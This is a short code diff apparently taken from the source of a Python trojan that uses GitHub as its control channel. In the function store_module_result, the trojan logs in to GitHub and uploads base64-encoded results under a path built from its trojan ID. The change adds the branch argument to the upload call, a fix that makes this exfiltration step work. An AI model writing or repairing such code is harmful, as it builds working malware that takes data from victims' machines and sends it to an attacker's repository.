@@ -58,7 +58,7 @@ def store_module_result(data):
     global usr, psw
     gh,repo,branch = connect_to_github(usr, psw)
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
-    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
+    repo.create_file(remote_path, "Commit message", base64.b64encode(data), branch)
     return
 
 
